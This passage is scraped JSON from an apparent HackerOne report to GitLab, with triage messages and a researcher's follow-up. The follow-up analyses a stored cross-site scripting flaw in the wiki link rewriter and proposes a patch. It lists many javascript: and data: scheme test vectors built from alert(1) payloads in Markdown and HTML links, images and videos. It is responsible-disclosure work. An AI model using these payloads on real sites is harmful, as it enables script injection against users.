more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4474075,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"#####Note:\nI omitted the items in your template of report that became blank after replacement of the (parenthesized) sections.\nI also omitted **Relevant logs and/or screenshots** section because I put a reference to the screenshots in the appropriate position.\nAs I would like to provide the more detailed information to you, I added **Additional Informations** section.\nThe **Impact** section duplicates with the same-name section of the HackerOne's submission form, so I wrote the **Impact** in the HackerOne's submission form which is set to required input.\n\nThank you,\nryhmnlfj","markdown_message":"\u003ch5 id=\"note\"\u003eNote:\u003c/h5\u003e\n\n\u003cp\u003eI omitted the items in your template of report that became blank after replacement of the (parenthesized) sections.\u003cbr\u003e\nI also omitted \u003cstrong\u003eRelevant logs and/or screenshots\u003c/strong\u003e section because I put a reference to the screenshots in the appropriate position.\u003cbr\u003e\nAs I would like to provide the more detailed information to you, I added \u003cstrong\u003eAdditional Informations\u003c/strong\u003e section.\u003cbr\u003e\nThe \u003cstrong\u003eImpact\u003c/strong\u003e section duplicates with the same-name section of the HackerOne\u0026#39;s submission form, so I wrote the \u003cstrong\u003eImpact\u003c/strong\u003e in the HackerOne\u0026#39;s submission form which is set to required input.\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\nryhmnlfj\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T12:24:00.789Z","updated_at":"2019-04-04T12:24:00.789Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4475496,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ryhmnlfj,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ryhmnlfj\"\u003e@ryhmnlfj\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 20 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-04-04T14:21:23.471Z","updated_at":"2019-04-04T14:21:23.471Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4495822,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ce/issues/60143.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/60143\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F60143\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/60143\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-06T02:00:41.873Z","updated_at":"2019-04-06T02:00:41.873Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4496265,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ryhmnlfj,\n\nThe GitLab issue created from your report is currently scheduled for 2019-06-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/ryhmnlfj\"\u003e@ryhmnlfj\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe GitLab issue created from your report is currently scheduled for 2019-06-22.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-04-06T04:31:36.274Z","updated_at":"2019-04-06T04:31:36.274Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4502735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan,\nThank you for triaging my first report!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e,\u003cbr\u003e\nThank you for triaging my first report!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-07T16:49:43.800Z","updated_at":"2019-04-07T16:49:43.800Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4864380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan,\n\nAfter submitting the first report, I investigated the backend source code. As a result, I found some new things, so I send this additional report. Though your mitigation may already be in progress or completed, I hope this report helps your reviewing and testing.\n\nThe environment I investigated is the official Docker installation of GitLab Enterprise Edition `11.10.4-ee`.\n\n## Vulnerable code\n\nAfter the GitLab application converts Markdown text to HTML Markup text, it performs URI string reconstruction and link replacement as Wiki-specific processing. The problem is that NO filtering is performed on the reconstructed URI string at this time. Here is the code that performs the URI string reconstruction:\n\n**lib/banzai/filter/wiki_link_filter/rewriter.rb**\n```ruby\n        def apply_rules\n          # Special case: relative URLs beginning with `/uploads/` refer to\n          # user-uploaded files will be handled elsewhere.\n          return @uri.to_s if public_upload?\n\n          # Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH\n          # refer to user-uploaded files to the wiki repository.\n          unless repository_upload?\n            apply_file_link_rules!\n            apply_hierarchical_link_rules!\n          end\n\n          apply_relative_link_rules!\n          @uri.to_s\n        end\n\n        private\n\n        # Of the form 'file.md'\n        def apply_file_link_rules!\n          @uri = Addressable::URI.join(@slug, @uri) if @uri.extname.present?\n        end\n\n        # Of the form `./link`, `../link`, or similar\n        def apply_hierarchical_link_rules!\n          @uri = Addressable::URI.join(@slug, @uri) if @uri.to_s[0] == '.'\n        end\n```\n\nIn the first reported case, `apply_hierarchical_link_rules!` function performs URI string reconstruction. If Title is `JavaScript::ClassName.function_name` and the Content is `[XSS](.alert(1);)` in the Wiki page creation form, the content of `@slug` is `JavaScript::ClassName.function_name` and the content of `@uri` is `.alert(1);`. `@slug` and `@uri` are combined by the `Addressable::URI.join` function, but parsing inside the `Addressable::URI.join` function removes `:ClassName.function_name` from `@slug` and `.` from `@uri` respectively. (I wrote in the first report that `.` is converted to `JavaScript:`, but in fact the unnecessary strings are removed from each variable respectively.) The problem is that NO filtering is performed on the URI strings reconstructed by `Addressable::URI.join` function. In this case, `apply_rules` function returns the reconstructed URI string as it is. And this string is used for link replacement.\n\n#### Another type of vector via `apply_file_link_rules!`\n\nAlso, `apply_file_link_rules!` function shows the existence of another similar vector. For example, if the Content is `[XSS](alert(document.location);)` in the Wiki page creation form, the content of `@uri` is `alert(document.location);`. `@uri.extname` returns the string `.location)` for the input string `alert(document.location);`. The string `.location)` is recognized as a file extension. Therefore, `@uri.extname.present?` returns true for the input string `alert(document.location);`, so `Addressable::URI.join` function is executed for this case as well.\n\n\n## Patch example for mitigation\n\nThe **expected *correct* behavior** I mentioned in the first report was as follows:\n\n\u003eThe dangerous href attribute `javascript:alert(1);` should be filtered.\n\u003eA safe HTTP/HTTPS link should be rendered instead.\n\nAn example of a patch with this policy is as follows. (However, this patch assumes that the content of `@wiki_base_path` is a safe URI string.)\n\n**lib/banzai/filter/wiki_link_filter/rewriter.rb**\n```diff\n        def apply_rules\n          # Special case: relative URLs beginning with `/uploads/` refer to\n          # user-uploaded files will be handled elsewhere.\n          return @uri.to_s if public_upload?\n\n          # Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH\n          # refer to user-uploaded files to the wiki repository.\n          unless repository_upload?\n            apply_file_link_rules!\n            apply_hierarchical_link_rules!\n          end\n\n          apply_relative_link_rules!\n+         block_unsafe_uri!\n          @uri.to_s\n        end\n\n        private\n\n+       def block_unsafe_uri!\n+         return unless @uri.scheme\n+         scheme = @uri.scheme.strip.downcase.gsub(/[^A-Za-z0-9\\+\\.\\-]+/, '')\n+         contains_unsafe = Banzai::Filter::SanitizationFilter::UNSAFE_PROTOCOLS.any? { |protocol| scheme.include?(protocol) }\n+         @uri = Addressable::URI.parse(@wiki_base_path) if contains_unsafe\n+       end\n```\n\nIf you need to remove attributes or tags themselves that contains the dangerous URI string, I think it would be better to do blocking within **lib/banzai/filter/wiki_link_filter.rb**.\n\nAlso, since the similar code have been written in **lib/banzai/filter/autolink_filter.rb** and **lib/banzai/filter/sanitization_filter.rb**, I think that it is better to make a shared module to prevent code clones.\n\n\n## Markdown/Markup elements in the scope of vulnerability\n\nIn the first report, I mentioned only the links generated by Markdown string `[LinkTitle](url)` as the scope of vulnerability, but in this investigation, I found that the links and attributes generated by Markdown string `![ImageOrVideoTitle](url)` are also in the scope. The following part of the source code points to it:\n\n**lib/banzai/filter/wiki_link_filter.rb**\n```ruby\n    class WikiLinkFilter \u003c HTML::Pipeline::Filter\n      def call\n        return doc unless project_wiki?\n\n        doc.search('a:not(.gfm)').each { |el| process_link_attr(el.attribute('href')) }\n        doc.search('video').each { |el| process_link_attr(el.attribute('src')) }\n        doc.search('img').each do |el|\n          attr = el.attribute('data-src') || el.attribute('src')\n\n          process_link_attr(attr)\n        end\n\n        doc\n      end\n```\nWhile `[LinkTitle](url)` only generates `\u003ca\u003e` tag, `![ImageOrVideoTitle](url)` generates both `\u003cimg\u003e`/`\u003cvideo\u003e` and `\u003ca\u003e`. `process_link_attr` function performs the above-mentioned replacement process on attributes of `\u003ca\u003e`, `\u003cimg\u003e` and `\u003cvideo\u003e`. `process_link_attr` function calls `apply_rules` function written in **lib/banzai/filter/wiki_link_filter/rewriter.rb** with appropriate arguments. Since `apply_rules` function is called as the replacement process, the mitigation is already sufficient as described above. However, test vectors to be described later will increase.\n\nWe can also write raw HTML within the Markdown text, so directly written `\u003ca\u003e`, `\u003cimg\u003e` and other tags are also included in the scope. I added some test vectors for these too.\n\n\n## Test vectors\n\nThe test vectors I used for this investigation are as follows.\n\n*Note: Some of these test vectors do not contain scripts, and some do not work depending on the browser and its security settings, but they all contain URIs that should be blocked.*\n\n### Test vectors for javascript: scheme\n\nTitle: `javascript::Test.vectors`\n\nContent:\n```\n# A href (Markdown)\n[A-href-Hierarchical-Dot](.alert(1);)\n\n[A-href-Hierarchical-DotDot](..alert(1);)\n\n[A-href-Hierarchical-DotSlashDotDotSlash](./../alert(1);)\n\n[A-href-Extname](alert(document.location);)\n\n# IMG (Markdown)\n![IMG-src-Hierarchical-Dot](.alert(1);)\n\n![IMG-src-Hierarchical-DotDot](..alert(1);)\n\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);)\n\n![IMG-src-Extname](alert(document.location);)\n\n# VIDEO (Markdown)\n![VIDEO-src-Hierarchical-Dot](.alert(1);//fake.mp4)\n\n![VIDEO-src-Hierarchical-DotDot](..alert(1);//fake.mp4)\n\n![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);//fake.mp4)\n\n![VIDEO-src-Extname](alert(document.location);//fake.mp4)\n\n# HTML A href (Markup)\n\u003ca href=\".alert(1);\"\u003eMARKUP-A-href-Hierarchical-Dot\u003c/a\u003e\n\n\u003ca href=\"..alert(1);\"\u003eMARKUP-A-href-Hierarchical-DotDot\u003c/a\u003e\n\n\u003ca href=\"./../alert(1);\"\u003eMARKUP-A-href-Hierarchical-DotSlashDotDotSlash\u003c/a\u003e\n\n\u003ca href=\"alert(document.location);\"\u003eMARKUP-A-href-Extname\u003c/a\u003e\n\n# HTML IMG (Markup)\n\u003cimg src=\".alert(1);\" alt=\"MARKUP-IMG-src-Hierarchical-Dot\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"..alert(1);\" alt=\"MARKUP-IMG-src-Hierarchical-DotDot\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"./../alert(1);\" alt=\"MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"alert(document.location);\" alt=\"MARKUP-IMG-src-Extname\"\u003e\u003c/img\u003e\n```\n\n### Test vectors for data: scheme\n\nTitle: `data::Test.vectors`\n\nContent:\n```\n# A href (Markdown)\n[A-href-Hierarchical-Dot](.text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n[A-href-Hierarchical-DotDot](..text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n[A-href-Hierarchical-DotSlashDotDotSlash](./../text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n[A-href-Extname](text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.text)\n\n# IMG (Markdown)\n![IMG-src-Hierarchical-Dot](.text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n![IMG-src-Hierarchical-DotDot](..text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../text/html,\u003cscript\u003ealert(1);\u003c/script\u003e)\n\n![IMG-src-Extname](text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.text)\n\n# VIDEO (Markdown)\n![VIDEO-src-Hierarchical](.text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.mp4)\n\n![VIDEO-src-Hierarchical-DoubleDot](..text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.mp4)\n\n![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.mp4)\n\n![VIDEO-src-Extname](text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.mp4)\n\n# HTML A href (Markup)\n\u003ca href=\".text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\"\u003eMARKUP-A-href-Hierarchical-Dot\u003c/a\u003e\n\n\u003ca href=\"..text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\"\u003eMARKUP-A-href-Hierarchical-DotDot\u003c/a\u003e\n\n\u003ca href=\"./../text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\"\u003eMARKUP-A-href-Hierarchical-DotSlashDotDotSlash\u003c/a\u003e\n\n\u003ca href=\"text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.text\"\u003eMARKUP-A-href-Extname\u003c/a\u003e\n\n# HTML IMG (Markup)\n\u003cimg src=\".text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\" alt=\"MARKUP-IMG-src-Hierarchical-Dot\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"..text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\" alt=\"MARKUP-IMG-src-Hierarchical-DotDot\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"./../text/html,\u003cscript\u003ealert(1);\u003c/script\u003e\" alt=\"MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash\"\u003e\u003c/img\u003e\n\n\u003cimg src=\"text/html,\u003cscript\u003ealert(1);\u003c/script\u003efake.text\" alt=\"MARKUP-IMG-src-Extname\"\u003e\u003c/img\u003e\n```\n\n\n### Visualized test vectors for data: scheme\n\nTitle: `data::VisualizedVectors.SVG`\n\nContent:\n```\nIMG-src-Hierarchical-Dot\n![IMG-src-Hierarchical-Dot](.image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n\nIMG-src-Hierarchical-DotDot\n![IMG-src-Hierarchical-DotDot](..image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n\nIMG-src-Hierarchical-DotSlashDotDotSlash\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n```\n\n*Note: The base64 string in these vectors is the encoded result of SVG as follows:*\n```\n\u003csvg x=\"50\" y=\"50\" width=\"50\" height=\"50\" xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"\u003e\n    \u003crect width=\"40\" height=\"40\" fill=\"green\" /\u003e\n\u003c/svg\u003e\n```\n*Here's screenshot of these vectors (VisualizedVectors.png):*\n\n{F491694}\n\n*I wanted to display GitLab Tanuki in these vectors, but I stopped it because the vector would be very long.*\n\n\n### Test vector for nested Title\n\nTitle: `javascript:/nest1/nest2/nest3`\n\nContent:\n```\n# A href (Markdown)\n[A-href-nested-Title](../../../*COMMENT*/alert(1);)\n\n# IMG (Markdown)\n![IMG-src-nested-Title](../../../*COMMENT*/alert(1);)\n\n# VIDEO (Markdown)\n![VIDEO-src-nested-Title](../../../*COMMENT*/alert(1);//fake.mp4)\n\n# HTML A href (Markup)\n\u003ca href=\"../../../*COMMENT*/alert(1);\"\u003eMARKUP-A-href-nested-Title\u003c/a\u003e\n\n# HTML IMG (Markup)\n\u003cimg src=\"../../../*COMMENT*/alert(1);\" alt=\"MARKUP-IMG-src-nested-Title\"\u003e\u003c/img\u003e\n```\n\n*Note: In these cases, the content of* `@slug` *is* `javascript:/nest1/nest2/nest3` *and the content of* `@uri` *is* `../../../*COMMENT*/alert(1);` *in* **lib/banzai/filter/wiki_link_filter/rewriter.rb**. *When combining* `@slug` *and* `@uri`, `Addressable::URI.join` *function also resolves relative path.*\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAfter submitting the first report, I investigated the backend source code. As a result, I found some new things, so I send this additional report. Though your mitigation may already be in progress or completed, I hope this report helps your reviewing and testing.\u003c/p\u003e\n\n\u003cp\u003eThe environment I investigated is the official Docker installation of GitLab Enterprise Edition \u003ccode\u003e11.10.4-ee\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"vulnerable-code\"\u003eVulnerable code\u003c/h2\u003e\n\n\u003cp\u003eAfter the GitLab application converts Markdown text to HTML Markup text, it performs URI string reconstruction and link replacement as Wiki-specific processing. The problem is that NO filtering is performed on the reconstructed URI string at this time. Here is the code that performs the URI string reconstruction:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003elib/banzai/filter/wiki_link_filter/rewriter.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e        \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eapply_rules\u003c/span\u003e\n          \u003cspan class=\"c1\"\u003e# Special case: relative URLs beginning with `/uploads/` refer to\u003c/span\u003e\n          \u003cspan class=\"c1\"\u003e# user-uploaded files will be handled elsewhere.\u003c/span\u003e\n          \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003epublic_upload?\u003c/span\u003e\n\n          \u003cspan class=\"c1\"\u003e# Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH\u003c/span\u003e\n          \u003cspan class=\"c1\"\u003e# refer to user-uploaded files to the wiki repository.\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eunless\u003c/span\u003e \u003cspan class=\"n\"\u003erepository_upload?\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eapply_file_link_rules!\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eapply_hierarchical_link_rules!\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n          \u003cspan class=\"n\"\u003eapply_relative_link_rules!\u003c/span\u003e\n          \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n        \u003cspan class=\"kp\"\u003eprivate\u003c/span\u003e\n\n        \u003cspan class=\"c1\"\u003e# Of the form \u0026#39;file.md\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eapply_file_link_rules!\u003c/span\u003e\n          \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eAddressable\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vi\"\u003e@slug\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eextname\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epresent?\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n        \u003cspan class=\"c1\"\u003e# Of the form `./link`, `../link`, or similar\u003c/span\u003e\n        \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eapply_hierarchical_link_rules!\u003c/span\u003e\n          \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eAddressable\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vi\"\u003e@slug\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vi\"\u003e@uri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the first reported case, \u003ccode\u003eapply_hierarchical_link_rules!\u003c/code\u003e function performs URI string reconstruction. If Title is \u003ccode\u003eJavaScript::ClassName.function_name\u003c/code\u003e and the Content is \u003ccode\u003e[XSS](.alert(1);)\u003c/code\u003e in the Wiki page creation form, the content of \u003ccode\u003e@slug\u003c/code\u003e is \u003ccode\u003eJavaScript::ClassName.function_name\u003c/code\u003e and the content of \u003ccode\u003e@uri\u003c/code\u003e is \u003ccode\u003e.alert(1);\u003c/code\u003e. \u003ccode\u003e@slug\u003c/code\u003e and \u003ccode\u003e@uri\u003c/code\u003e are combined by the \u003ccode\u003eAddressable::URI.join\u003c/code\u003e function, but parsing inside the \u003ccode\u003eAddressable::URI.join\u003c/code\u003e function removes \u003ccode\u003e:ClassName.function_name\u003c/code\u003e from \u003ccode\u003e@slug\u003c/code\u003e and \u003ccode\u003e.\u003c/code\u003e from \u003ccode\u003e@uri\u003c/code\u003e respectively. (I wrote in the first report that \u003ccode\u003e.\u003c/code\u003e is converted to \u003ccode\u003eJavaScript:\u003c/code\u003e, but in fact the unnecessary strings are removed from each variable respectively.) The problem is that NO filtering is performed on the URI strings reconstructed by \u003ccode\u003eAddressable::URI.join\u003c/code\u003e function. In this case, \u003ccode\u003eapply_rules\u003c/code\u003e function returns the reconstructed URI string as it is. And this string is used for link replacement.\u003c/p\u003e\n\n\u003ch4 id=\"another-type-of-vector-via-apply_file_link_rules\"\u003eAnother type of vector via \u003ccode\u003eapply_file_link_rules!\u003c/code\u003e\n\u003c/h4\u003e\n\n\u003cp\u003eAlso, \u003ccode\u003eapply_file_link_rules!\u003c/code\u003e function shows the existence of another similar vector. For example, if the Content is \u003ccode\u003e[XSS](alert(document.location);)\u003c/code\u003e in the Wiki page creation form, the content of \u003ccode\u003e@uri\u003c/code\u003e is \u003ccode\u003ealert(document.location);\u003c/code\u003e. \u003ccode\u003e@uri.extname\u003c/code\u003e returns the string \u003ccode\u003e.location)\u003c/code\u003e for the input string \u003ccode\u003ealert(document.location);\u003c/code\u003e. The string \u003ccode\u003e.location)\u003c/code\u003e is recognized as a file extension. Therefore, \u003ccode\u003e@uri.extname.present?\u003c/code\u003e returns true for the input string \u003ccode\u003ealert(document.location);\u003c/code\u003e, so \u003ccode\u003eAddressable::URI.join\u003c/code\u003e function is executed for this case as well.\u003c/p\u003e\n\n\u003ch2 id=\"patch-example-for-mitigation\"\u003ePatch example for mitigation\u003c/h2\u003e\n\n\u003cp\u003eThe \u003cstrong\u003eexpected \u003cem\u003ecorrect\u003c/em\u003e behavior\u003c/strong\u003e I mentioned in the first report was as follows:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe dangerous href attribute \u003ccode\u003ejavascript:alert(1);\u003c/code\u003e should be filtered.\u003cbr\u003e\nA safe HTTP/HTTPS link should be rendered instead.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAn example of a patch with this policy is as follows. (However, this patch assumes that the content of \u003ccode\u003e@wiki_base_path\u003c/code\u003e is a safe URI 